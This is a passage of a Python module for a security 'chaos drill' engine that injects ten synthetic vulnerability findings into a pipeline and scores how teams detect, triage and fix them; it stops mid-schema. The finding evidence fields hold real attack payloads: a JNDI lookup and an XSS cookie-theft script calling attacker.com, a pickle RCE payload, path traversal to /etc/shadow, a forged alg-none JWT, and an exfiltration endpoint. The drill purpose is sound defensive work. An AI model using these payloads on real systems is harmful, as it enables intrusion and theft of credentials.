"""
FixOps FAIL Engine — Fault & Attack Injection Layer
suite-attack edition

The FAIL Engine is a chaos engineering system for security teams. It injects
synthetic vulnerabilities into the FixOps finding pipeline, then measures how
fast and accurately the security team detects, triages, and remediates them.

This is NOT a CVSS scoring engine. It is a readiness measurement system:
  - Inject a synthetic Log4Shell finding at 09:00
  - Measure: detected at 09:14 (14 min), triaged as CRITICAL at 09:21, fix PR at 10:43
  - Score: Detection=8.2, Triage=9.0, Remediation=7.1, Communication=6.5 → Overall=7.9

Ten injection scenarios:
  1. Log4Shell (RCE via JNDI lookup)
  2. SQL Injection (parameterised → string concatenation)
  3. SSRF (internal service access)
  4. Path Traversal (directory escape)
  5. Insecure Deserialization (pickle/yaml.load)
  6. Hardcoded Credentials (AWS keys, DB passwords)
  7. Broken Auth (JWT none algorithm, session fixation)
  8. XSS (reflected, stored, DOM-based)
  9. Cryptographic Weakness (MD5, SHA1, ECB mode)
  10. Supply Chain (typosquatting dependency)

Usage:
    from attack.fail_engine import DrillEngine, DrillScenario

    engine = DrillEngine()
    drill = engine.create_drill(
        scenario="log4shell",
        target_component="auth-service",
        org_id="org-123",
    )
    score = engine.grade_drill(drill.drill_id)
"""

from __future__ import annotations

import json
import logging
import os
import sqlite3
import uuid
from contextlib import contextmanager
from dataclasses import asdict, dataclass, field
from datetime import datetime, timedelta, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, Generator, List, Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

DB_DIR = Path(os.environ.get("FIXOPS_DATA_DIR", ".fixops_data"))
DB_PATH = DB_DIR / "fail_engine.db"

ENGINE_VERSION = "2.0.0"

NEGLECT_THRESHOLD_DAYS = 90          # Component is neglected if no activity for this long
READINESS_DRILL_WINDOW = 10          # Rolling window for readiness score
INDUSTRY_BENCHMARK_DEFAULT = 6.5    # Default industry baseline (0-10)

# Score dimension weights (must sum to 1.0)
SCORE_WEIGHTS = {
    "detection_speed": 0.30,
    "triage_accuracy": 0.25,
    "remediation_speed": 0.30,
    "communication": 0.15,
}

# Expected SLA targets (minutes) — used for speed scoring
DETECTION_SLA_MINUTES = 60          # Ideal: detect within 60 min
TRIAGE_SLA_MINUTES = 30             # Ideal: triage within 30 min of detection
REMEDIATION_SLA_MINUTES = 480       # Ideal: fix within 8 hours


# ---------------------------------------------------------------------------
# Enums
# ---------------------------------------------------------------------------


class DrillStatus(str, Enum):
    PENDING = "pending"
    ACTIVE = "active"
    DETECTED = "detected"
    TRIAGED = "triaged"
    REMEDIATED = "remediated"
    GRADED = "graded"
    CANCELLED = "cancelled"
    EXPIRED = "expired"


class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class TriageClassification(str, Enum):
    REAL_CRITICAL = "real_critical"
    REAL_HIGH = "real_high"
    REAL_MEDIUM = "real_medium"
    REAL_LOW = "real_low"
    FALSE_POSITIVE = "false_positive"
    SYNTHETIC = "synthetic"          # Correctly identified as a drill
    WONT_FIX = "wont_fix"


class ReadinessTrend(str, Enum):
    IMPROVING = "improving"
    DECLINING = "declining"
    STABLE = "stable"
    INSUFFICIENT_DATA = "insufficient_data"


# ---------------------------------------------------------------------------
# Scenario Library
# ---------------------------------------------------------------------------


@dataclass
class VulnerabilityScenario:
    """
    A pre-defined synthetic vulnerability scenario.

    Each scenario knows what a realistic finding looks like (CVE, CVSS, etc.)
    and what the ideal team response should be.
    """

    scenario_id: str
    name: str
    description: str
    severity: Severity
    cve_id: Optional[str]
    cvss_score: float
    cwe_ids: List[str]
    mitre_techniques: List[str]           # ATT&CK technique IDs
    mitre_tactics: List[str]
    synthetic_finding: Dict[str, Any]     # The injected finding payload
    expected_detection_minutes: int       # Target: detect within N minutes
    expected_triage_classification: TriageClassification
    expected_remediation_approach: str
    is_custom: bool = False
    created_at: str = field(default_factory=lambda: _utcnow_iso())
    tags: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["severity"] = self.severity.value
        d["expected_triage_classification"] = self.expected_triage_classification.value
        return d


def _utcnow() -> datetime:
    return datetime.now(timezone.utc)


def _utcnow_iso() -> str:
    return _utcnow().isoformat()


def _build_scenario_library() -> Dict[str, VulnerabilityScenario]:
    """Build and return the full built-in scenario library."""

    scenarios: Dict[str, VulnerabilityScenario] = {}

    # ------------------------------------------------------------------
    # 1. Log4Shell — CVE-2021-44228
    # ------------------------------------------------------------------
    scenarios["log4shell"] = VulnerabilityScenario(
        scenario_id="log4shell",
        name="Log4Shell RCE (CVE-2021-44228)",
        description=(
            "Apache Log4j2 JNDI lookup injection allowing unauthenticated remote code "
            "execution. Attacker-controlled LDAP URL is processed in log output, "
            "triggering outbound connection and arbitrary class loading."
        ),
        severity=Severity.CRITICAL,
        cve_id="CVE-2021-44228",
        cvss_score=10.0,
        cwe_ids=["CWE-917", "CWE-20"],
        mitre_techniques=["T1190", "T1059.007", "T1105"],
        mitre_tactics=["Initial Access", "Execution", "Command and Control"],
        synthetic_finding={
            "title": "Log4j2 Remote Code Execution via JNDI Injection (CVE-2021-44228)",
            "description": (
                "The application uses Apache Log4j2 < 2.15.0 and logs user-controlled "
                "input. A JNDI lookup string (${jndi:ldap://attacker.com/a}) in any "
                "logged field triggers outbound DNS/LDAP and enables arbitrary code "
                "execution as the application user."
            ),
            "cve_id": "CVE-2021-44228",
            "cvss_score": 10.0,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "severity": "critical",
            "affected_package": "org.apache.logging.log4j:log4j-core",
            "affected_version_range": "<2.15.0",
            "fixed_version": "2.15.0",
            "evidence": {
                "detected_payload": "${jndi:ldap://169.254.169.254/latest/meta-data/}",
                "log_line": "2024-01-15 09:12:33 ERROR UserService - Login failed for: "
                            "${jndi:ldap://169.254.169.254/latest/meta-data/}",
                "outbound_connection": "169.254.169.254:389",
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=30,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Upgrade log4j-core to >= 2.15.0 (or 2.17.1 for CVE-2021-45105). "
            "Set log4j2.formatMsgNoLookups=true as interim mitigation. "
            "Block JNDI lookups at WAF/network layer. Rotate credentials on affected hosts."
        ),
        tags=["rce", "jndi", "log4j", "critical", "kev"],
    )

    # ------------------------------------------------------------------
    # 2. SQL Injection — parameterised → string concatenation
    # ------------------------------------------------------------------
    scenarios["sqli"] = VulnerabilityScenario(
        scenario_id="sqli",
        name="SQL Injection via String Concatenation",
        description=(
            "A database query was refactored from a parameterised prepared statement "
            "to raw string concatenation, introducing a classic SQL injection vector."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=8.8,
        cwe_ids=["CWE-89"],
        mitre_techniques=["T1190", "T1213"],
        mitre_tactics=["Initial Access", "Collection"],
        synthetic_finding={
            "title": "SQL Injection — User-controlled input in raw DB query",
            "description": (
                "The search endpoint constructs SQL queries via string concatenation: "
                "query = 'SELECT * FROM users WHERE name = ' + user_input. "
                "An attacker can extract the full database with a UNION-based payload."
            ),
            "cve_id": None,
            "cvss_score": 8.8,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "severity": "high",
            "affected_endpoint": "/api/v1/users/search",
            "affected_file": "app/repositories/user_repository.py",
            "affected_line": 147,
            "evidence": {
                "vulnerable_code": "query = f\"SELECT * FROM users WHERE name = '{user_input}'\"",
                "payload_detected": "' OR '1'='1",
                "rows_extractable": "all",
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=45,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Replace string concatenation with parameterised queries / prepared statements. "
            "Use ORM query builders. Add input validation at controller layer. "
            "Deploy WAF rule for SQLi patterns as interim control."
        ),
        tags=["sqli", "injection", "database", "high"],
    )

    # ------------------------------------------------------------------
    # 3. SSRF — internal service access
    # ------------------------------------------------------------------
    scenarios["ssrf"] = VulnerabilityScenario(
        scenario_id="ssrf",
        name="Server-Side Request Forgery (SSRF)",
        description=(
            "The application fetches URLs supplied by the user without validation, "
            "allowing attackers to scan internal services and read cloud metadata."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=7.5,
        cwe_ids=["CWE-918"],
        mitre_techniques=["T1190", "T1046", "T1552.005"],
        mitre_tactics=["Initial Access", "Discovery", "Credential Access"],
        synthetic_finding={
            "title": "SSRF — Unvalidated URL fetch reaches AWS metadata endpoint",
            "description": (
                "The /api/fetch endpoint accepts a user-supplied URL and retrieves it "
                "server-side. No allowlist or network policy prevents internal requests. "
                "AWS IMDSv1 metadata is accessible at http://169.254.169.254/latest/"
            ),
            "cve_id": None,
            "cvss_score": 7.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "severity": "high",
            "affected_endpoint": "/api/fetch",
            "affected_file": "app/handlers/fetch_handler.py",
            "affected_line": 38,
            "evidence": {
                "ssrf_target": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "response_received": True,
                "credentials_exposed": ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"],
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=60,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Implement strict URL allowlist. Block RFC-1918 and link-local ranges "
            "(169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). "
            "Enable IMDSv2 (token-required) on all EC2 instances. "
            "Add egress network policy to restrict fetch service."
        ),
        tags=["ssrf", "cloud", "metadata", "aws", "high"],
    )

    # ------------------------------------------------------------------
    # 4. Path Traversal — directory escape
    # ------------------------------------------------------------------
    scenarios["path_traversal"] = VulnerabilityScenario(
        scenario_id="path_traversal",
        name="Path Traversal — Directory Escape",
        description=(
            "File download endpoint appends user-supplied filename to a base directory "
            "without normalisation, allowing '../' sequences to escape the sandbox."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=7.5,
        cwe_ids=["CWE-22", "CWE-23"],
        mitre_techniques=["T1083", "T1005"],
        mitre_tactics=["Discovery", "Collection"],
        synthetic_finding={
            "title": "Path Traversal — Arbitrary file read via ../  sequences",
            "description": (
                "GET /api/files/download?name=../../etc/passwd successfully returns "
                "the system password file. The server joins the base path and the "
                "user-supplied name without path normalisation or jailing."
            ),
            "cve_id": None,
            "cvss_score": 7.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "severity": "high",
            "affected_endpoint": "/api/files/download",
            "affected_file": "app/handlers/file_handler.py",
            "affected_line": 72,
            "evidence": {
                "payload": "../../etc/passwd",
                "resolved_path": "/etc/passwd",
                "file_returned": True,
                "sensitive_files_accessible": ["/etc/passwd", "/etc/shadow", "~/.ssh/id_rsa"],
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=45,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Use os.path.realpath() and verify the resolved path starts with the "
            "intended base directory. Reject any path containing '..'. "
            "Use a dedicated file serving library that handles this automatically. "
            "Apply principle of least privilege for file system access."
        ),
        tags=["path-traversal", "lfi", "file", "high"],
    )

    # ------------------------------------------------------------------
    # 5. Insecure Deserialization — pickle/yaml.load
    # ------------------------------------------------------------------
    scenarios["insecure_deserialization"] = VulnerabilityScenario(
        scenario_id="insecure_deserialization",
        name="Insecure Deserialization (pickle/yaml.load)",
        description=(
            "The API deserialises user-supplied data using Python pickle or "
            "yaml.load() without safe_load(), enabling arbitrary code execution."
        ),
        severity=Severity.CRITICAL,
        cve_id=None,
        cvss_score=9.8,
        cwe_ids=["CWE-502"],
        mitre_techniques=["T1059.006", "T1190"],
        mitre_tactics=["Execution", "Initial Access"],
        synthetic_finding={
            "title": "Insecure Deserialization — pickle.loads() on user-supplied data",
            "description": (
                "The /api/session/restore endpoint accepts a base64-encoded session "
                "blob and deserialises it with pickle.loads(). An attacker can craft "
                "a malicious pickle payload to execute arbitrary OS commands."
            ),
            "cve_id": None,
            "cvss_score": 9.8,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "severity": "critical",
            "affected_endpoint": "/api/session/restore",
            "affected_file": "app/handlers/session_handler.py",
            "affected_line": 56,
            "evidence": {
                "deserializer": "pickle.loads",
                "input_source": "POST body (base64-encoded)",
                "poc_payload": "cos\nsystem\n(S'id'\ntR.",
                "rce_achieved": True,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=20,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Never deserialise user-controlled data with pickle. "
            "Use JSON or MessagePack for session data. "
            "If YAML is required, always use yaml.safe_load(). "
            "Add input size limits and type checks before any deserialisation."
        ),
        tags=["deserialization", "rce", "pickle", "yaml", "critical"],
    )

    # ------------------------------------------------------------------
    # 6. Hardcoded Credentials — AWS keys, DB passwords
    # ------------------------------------------------------------------
    scenarios["hardcoded_credentials"] = VulnerabilityScenario(
        scenario_id="hardcoded_credentials",
        name="Hardcoded Credentials (AWS Keys / DB Passwords)",
        description=(
            "Live AWS access keys and database passwords committed directly in "
            "source code, accessible to anyone with repository access."
        ),
        severity=Severity.CRITICAL,
        cve_id=None,
        cvss_score=9.1,
        cwe_ids=["CWE-798", "CWE-259"],
        mitre_techniques=["T1552.001", "T1078"],
        mitre_tactics=["Credential Access", "Defense Evasion"],
        synthetic_finding={
            "title": "Hardcoded AWS Credentials and Database Password in Source Code",
            "description": (
                "Committed file config/settings.py contains live AWS access key "
                "AKIA[REDACTED] and a plaintext database password. "
                "These credentials grant access to production S3 buckets and RDS instance."
            ),
            "cve_id": None,
            "cvss_score": 9.1,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "severity": "critical",
            "affected_file": "config/settings.py",
            "affected_lines": [23, 24, 41],
            "evidence": {
                "credentials_found": [
                    {"type": "aws_access_key", "pattern": "AKIA[0-9A-Z]{16}", "line": 23},
                    {"type": "aws_secret_key", "pattern": "[0-9a-zA-Z/+]{40}", "line": 24},
                    {"type": "db_password", "pattern": "DB_PASSWORD = \"...*\"", "line": 41},
                ],
                "git_history_exposure": True,
                "commit_count_with_secret": 47,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=15,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Immediately rotate all exposed credentials. "
            "Remove secrets from source code and git history (BFG Repo-Cleaner). "
            "Move to secrets manager (AWS Secrets Manager, HashiCorp Vault). "
            "Add pre-commit hooks (detect-secrets, truffleHog) to prevent re-introduction."
        ),
        tags=["credentials", "secrets", "aws", "database", "critical", "kev"],
    )

    # ------------------------------------------------------------------
    # 7. Broken Auth — JWT none algorithm / session fixation
    # ------------------------------------------------------------------
    scenarios["broken_auth"] = VulnerabilityScenario(
        scenario_id="broken_auth",
        name="Broken Auth — JWT None Algorithm / Session Fixation",
        description=(
            "Authentication bypass via JWT 'none' algorithm or session fixation attack, "
            "allowing an attacker to impersonate any user including administrators."
        ),
        severity=Severity.CRITICAL,
        cve_id=None,
        cvss_score=9.8,
        cwe_ids=["CWE-287", "CWE-384", "CWE-347"],
        mitre_techniques=["T1078", "T1550.001"],
        mitre_tactics=["Defense Evasion", "Lateral Movement"],
        synthetic_finding={
            "title": "JWT None Algorithm Accepted — Authentication Bypass",
            "description": (
                "The JWT validation code accepts the 'alg: none' header value, "
                "allowing unsigned tokens to pass authentication. An attacker can "
                "forge a token for any user_id including admin accounts without "
                "knowing the signing secret."
            ),
            "cve_id": None,
            "cvss_score": 9.8,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "severity": "critical",
            "affected_endpoint": "/api/v1/auth/verify",
            "affected_file": "app/middleware/auth_middleware.py",
            "affected_line": 88,
            "evidence": {
                "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.",
                "user_impersonated": "admin (user_id=1)",
                "access_granted": True,
                "session_fixation_also_present": True,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=20,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Explicitly reject 'none' algorithm in JWT validation. "
            "Use asymmetric signing (RS256/ES256) instead of HS256. "
            "Validate alg header against a strict allowlist. "
            "Regenerate session ID after authentication (session fixation). "
            "Implement refresh token rotation."
        ),
        tags=["jwt", "broken-auth", "session", "critical"],
    )

    # ------------------------------------------------------------------
    # 8. XSS — reflected, stored, DOM-based
    # ------------------------------------------------------------------
    scenarios["xss"] = VulnerabilityScenario(
        scenario_id="xss",
        name="Cross-Site Scripting (Reflected + Stored)",
        description=(
            "User-controlled data rendered in HTML without encoding. Both reflected "
            "(via URL parameter) and stored (via database) XSS vectors present."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=7.4,
        cwe_ids=["CWE-79", "CWE-80", "CWE-83"],
        mitre_techniques=["T1059.007", "T1185"],
        mitre_tactics=["Execution", "Collection"],
        synthetic_finding={
            "title": "Stored and Reflected XSS — Unencoded user input in HTML output",
            "description": (
                "The user profile 'bio' field stores HTML content without sanitisation. "
                "When rendered in admin views, arbitrary scripts execute in browser context. "
                "The /search?q= parameter is also reflected without encoding."
            ),
            "cve_id": None,
            "cvss_score": 7.4,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "severity": "high",
            "affected_endpoints": [
                "/api/v1/users/{id}/profile",
                "/search",
                "/admin/users",
            ],
            "evidence": {
                "stored_payload": "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
                "reflected_payload": "<img src=x onerror=alert(1)>",
                "dom_payload": "javascript:void(eval(location.hash.slice(1)))",
                "cookie_theft_possible": True,
                "csp_present": False,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=60,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Apply context-sensitive output encoding (HTML entity, JS, CSS, URL). "
            "Use a trusted HTML sanitiser (DOMPurify) for rich text. "
            "Implement strict Content-Security-Policy (script-src 'self'). "
            "Set HttpOnly and SameSite=Strict on session cookies."
        ),
        tags=["xss", "injection", "browser", "csp", "high"],
    )

    # ------------------------------------------------------------------
    # 9. Cryptographic Weakness — MD5/SHA1/ECB mode
    # ------------------------------------------------------------------
    scenarios["crypto_weakness"] = VulnerabilityScenario(
        scenario_id="crypto_weakness",
        name="Cryptographic Weakness (MD5/SHA1/ECB Mode)",
        description=(
            "Passwords hashed with MD5 or SHA1 (no salt), and symmetric encryption "
            "using AES in ECB mode — allowing pattern analysis and rainbow table attacks."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=7.5,
        cwe_ids=["CWE-327", "CWE-328", "CWE-760"],
        mitre_techniques=["T1110.002", "T1552.001"],
        mitre_tactics=["Credential Access"],
        synthetic_finding={
            "title": "Weak Cryptography — MD5 Password Hashing and AES-ECB Encryption",
            "description": (
                "User passwords are hashed with MD5 without salt (hashlib.md5(password)). "
                "Encryption of user data uses AES in ECB mode. "
                "MD5 hashes are trivially reversed via rainbow tables. "
                "ECB mode leaks patterns in encrypted data."
            ),
            "cve_id": None,
            "cvss_score": 7.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "severity": "high",
            "affected_files": [
                "app/auth/password_utils.py",
                "app/crypto/encryption.py",
            ],
            "evidence": {
                "hash_algorithm": "MD5",
                "salt_used": False,
                "encryption_mode": "AES-ECB",
                "crackable_hashes": ["5f4dcc3b5aa765d61d8327deb882cf99 (password)"],
                "pattern_leak_demo": True,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=90,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Replace MD5/SHA1 with bcrypt, scrypt, or Argon2id for password hashing. "
            "Use AES-GCM or AES-CBC (with random IV) instead of ECB mode. "
            "Plan a credential rotation for all affected users. "
            "Add automated crypto policy checks to CI pipeline."
        ),
        tags=["crypto", "md5", "sha1", "ecb", "password", "high"],
    )

    # ------------------------------------------------------------------
    # 10. Supply Chain — typosquatting dependency
    # ------------------------------------------------------------------
    scenarios["supply_chain"] = VulnerabilityScenario(
        scenario_id="supply_chain",
        name="Supply Chain Attack — Typosquatting Dependency",
        description=(
            "A package with a name one character off from a popular library was "
            "installed. The package exfiltrates environment variables on import."
        ),
        severity=Severity.CRITICAL,
        cve_id=None,
        cvss_score=9.0,
        cwe_ids=["CWE-1357", "CWE-494"],
        mitre_techniques=["T1195.001", "T1059.006", "T1020"],
        mitre_tactics=["Initial Access", "Execution", "Exfiltration"],
        synthetic_finding={
            "title": "Typosquatting Dependency — 'reqeusts' exfiltrates environment on import",
            "description": (
                "requirements.txt contains 'reqeusts==2.31.0' (note: misspelling of 'requests'). "
                "This package is not the legitimate requests library. "
                "Its __init__.py sends all environment variables to an attacker endpoint "
                "at import time, including API keys and database credentials."
            ),
            "cve_id": None,
            "cvss_score": 9.0,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
            "severity": "critical",
            "affected_file": "requirements.txt",
            "affected_line": 17,
            "evidence": {
                "malicious_package": "reqeusts",
                "legitimate_package": "requests",
                "exfiltration_endpoint": "https://collector.evil.example.com/env",
                "data_exfiltrated": ["AWS_ACCESS_KEY_ID", "DATABASE_URL", "SECRET_KEY"],
                "installed_on_hosts": 3,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=120,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Remove malicious package immediately. "
            "Rotate ALL environment variables and secrets (full compromise assumed). "
            "Replace with legitimate 'requests' package. "
            "Enable package hash pinning in requirements.txt. "
            "Add dependency confusion and typosquatting checks to CI (pip-audit, safety). "
            "Enable private PyPI mirror for production deployments."
        ),
        tags=["supply-chain", "typosquatting", "dependency", "critical", "exfiltration"],
    )

    return scenarios


# ---------------------------------------------------------------------------
# Drill data structures
# ---------------------------------------------------------------------------


@dataclass
class DrillTimeline:
    """Timestamped events for a drill's lifecycle."""

    drill_id: str
    injected_at: Optional[str] = None
    detected_at: Optional[str] = None
    triaged_at: Optional[str] = None
    remediated_at: Optional[str] = None
    graded_at: Optional[str] = None
    cancelled_at: Optional[str] = None
    events: List[Dict[str, Any]] = field(default_factory=list)

    def add_event(self, event_type: str, detail: str, actor: Optional[str] = None) -> None:
        self.events.append({
            "event_type": event_type,
            "detail": detail,
            "actor": actor,
            "timestamp": _utcnow_iso(),
        })

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class DrillScore:
    """4-dimension score for a completed drill."""

    drill_id: str

    # Dimension scores (0-10)
    detection_speed: float = 0.0         # How fast was the finding noticed?
    triage_accuracy: float = 0.0         # Was it correctly classified?
    remediation_speed: float = 0.0       # How fast was the fix applied?
    communication: float = 0.0           # Was the right team notified?

    # Overall weighted score
    overall: float = 0.0

    # Detailed breakdown
    detection_minutes_actual: Optional[int] = None
    detection_minutes_target: Optional[int] = None
    triage_classification_actual: Optional[str] = None
    triage_classification_expected: Optional[str] = None
    remediation_minutes_actual: Optional[int] = None
    escalated_correctly: bool = False
    team_notified: bool = False

    # Grade
    grade: str = "F"
    feedback: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class Drill:
    """
    A single FAIL Engine drill — a synthetic vulnerability injection with
    full lifecycle tracking and scoring.
    """

    drill_id: str
    scenario_id: str
    scenario_name: str
    target_component: str
    org_id: str
    status: DrillStatus = DrillStatus.PENDING
    severity: Severity = Severity.HIGH

    # Synthetic finding injected into the pipeline
    synthetic_finding_id: str = field(default_factory=lambda: f"SYN-{uuid.uuid4().hex[:10].upper()}")
    synthetic_finding: Dict[str, Any] = field(default_factory=dict)

    # Response tracking
    detected_by: Optional[str] = None
    triaged_by: Optional[str] = None
    remediated_by: Optional[str] = None
    triage_classification: Optional[TriageClassification] = None
    escalated: bool = False
    notified_teams: List[str] = field(default_factory=list)

    # Scoring
    score: Optional[DrillScore] = None

    # Timeline
    timeline: DrillTimeline = field(default_factory=lambda: DrillTimeline(drill_id=""))

    # Metadata
    created_at: str = field(default_factory=_utcnow_iso)
    expires_at: str = field(default_factory=lambda: (
        _utcnow() + timedelta(hours=48)
    ).isoformat())
    notes: str = ""

    def __post_init__(self) -> None:
        if not self.timeline.drill_id:
            self.timeline.drill_id = self.drill_id

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["status"] = self.status.value
        d["severity"] = self.severity.value
        if self.triage_classification:
            d["triage_classification"] = self.triage_classification.value
        return d


# ---------------------------------------------------------------------------
# Training data structures (ML feedback loop)
# ---------------------------------------------------------------------------


@dataclass
class TrainingSample:
    """
    A labeled training sample generated from a completed drill.

    Two primary signals:
    1. Detection signal: was the synthetic finding detected, and how fast?
    2. Triage signal: was it correctly classified?
    """

    sample_id: str
    drill_id: str
    org_id: str
    scenario_id: str
    severity: str

    # Detection label
    detected: bool = False
    detection_minutes: Optional[int] = None
    detection_label: str = "missed"          # "fast" | "slow" | "missed"

    # Triage label
    triage_correct: bool = False
    triage_expected: Optional[str] = None
    triage_actual: Optional[str] = None
    triage_label: str = "incorrect"          # "correct" | "incorrect" | "skipped"

    # Features for ML models
    features: Dict[str, Any] = field(default_factory=dict)

    created_at: str = field(default_factory=_utcnow_iso)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ---------------------------------------------------------------------------
# Neglect Zone
# ---------------------------------------------------------------------------


@dataclass
class NeglectZone:
    """A component with no recent security activity."""

    component: str
    org_id: str
    last_activity_at: Optional[str]
    days_since_activity: int
    activity_types_missing: List[str]          # scan, review, drill
    risk_level: str                            # low, medium, high, urgent
    has_critical_data: bool = False
    suggested_drill_scenario: Optional[str] = None
    reason: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ---------------------------------------------------------------------------
# Readiness Score
# ---------------------------------------------------------------------------


@dataclass
class ReadinessScore:
    """Organisation and team readiness aggregation."""

    org_id: str
    overall_score: float                       # 0-10 rolling average
    drill_count: int
    last_drill_at: Optional[str]
    trend: ReadinessTrend
    team_scores: Dict[str, float]             # team_name → score
    dimension_averages: Dict[str, float]      # detection_speed → avg, etc.
    industry_benchmark: float
    benchmark_delta: float                    # org - benchmark
    percentile: int                           # 0-100
    graded_drills: List[Dict[str, Any]]       # last N drill summaries
    computed_at: str = field(default_factory=_utcnow_iso)

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["trend"] = self.trend.value
        return d


# ---------------------------------------------------------------------------
# SQLite Database Layer
# ---------------------------------------------------------------------------


class DrillDB:
    """
    SQLite-backed persistence layer for the FAIL Engine (suite-attack edition).

    Tables:
      fail_drills           — drill records
      fail_scenarios        — built-in + custom scenarios
      fail_activity_log     — component security activity tracking
      fail_training_samples — labeled ML training data
    """

    def __init__(self, db_path: Optional[Path] = None) -> None:
        self._db_path = Path(db_path or DB_PATH)
        self._db_path.parent.mkdir(parents=True, exist_ok=True)
        self._init_db()

    @contextmanager
    def _conn(self) -> Generator[sqlite3.Connection, None, None]:
        conn = sqlite3.connect(str(self._db_path), check_same_thread=False)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA foreign_keys=ON")
        try:
            yield conn
            conn.commit()
        except (ValueError, KeyError, RuntimeError, TypeError, AttributeError):
            conn.rollback()
            raise
        finally:
            conn.close()

    def _init_db(self) -> None:
        with self._conn() as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS fail_drills (
                    drill_id            TEXT PRIMARY KEY,
                    scenario_id         TEXT NOT NULL,
                    scenario_name       TEXT NOT NULL,
                    target_component    TEXT NOT NULL,
                    org_id              TEXT NOT NULL,
                    status              TEXT NOT NULL DEFAULT 'pending',
                    severity            TEXT NOT NULL DEFAULT 'high',
                    synthetic_finding_id TEXT NOT NULL,
                    synthetic_finding   TEXT NOT NULL DEFAULT '{}',
                    detected_by         TEXT,
                    triaged_by          TEXT,
                    remediated_by       TEXT,
                    triage_classification TEXT,
                    escalated           INTEGER NOT NULL DEFAULT 0,
                    notified_teams      TEXT NOT NULL DEFAULT '[]',
                    score_json          TEXT,
                    timeline_json       TEXT NOT NULL DEFAULT '{}',
                    created_at          TEXT NOT NULL,
                    expires_at          TEXT NOT NULL,
                    notes               TEXT NOT NULL DEFAULT ''
                );

                CREATE INDEX IF NOT EXISTS idx_fail_drills_org
                    ON fail_drills(org_id);
                CREATE INDEX IF NOT EXISTS idx_fail_drills_status
                    ON fail_drills(status);
                CREATE INDEX IF NOT EXISTS idx_fail_drills_created
                    ON fail_drills(created_at);
                CREATE INDEX IF NOT EXISTS idx_fail_drills_component
                    ON fail_drills(target_component);

                CREATE TABLE IF NOT EXISTS fail_scenarios (
